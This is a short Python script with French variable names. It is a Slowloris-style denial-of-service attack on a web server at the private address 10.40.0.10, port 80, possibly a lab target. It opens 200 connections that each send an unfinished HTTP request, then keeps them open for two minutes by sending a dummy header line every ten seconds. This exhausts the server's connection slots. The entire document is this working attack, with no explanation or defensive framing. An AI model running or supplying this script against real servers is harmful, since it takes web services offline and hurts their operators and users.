import socket, time
HOST, PORT, N, DUREE = "10.40.0.10", 80, 200, 120
socks = []
for i in range(N):
    try:
        s = socket.socket(); s.settimeout(4); s.connect((HOST, PORT))
        s.send(b"GET /?x=%d HTTP/1.1\r\nHost: cible\r\n" % i)
        socks.append(s)
    except OSError:
        pass
print("connexions ouvertes:", len(socks))
fin = time.time() + DUREE
while time.time() < fin:
    for s in list(socks):
        try: s.send(b"X-a: b\r\n")
        except OSError: socks.remove(s)
    time.sleep(10)
print("fin")
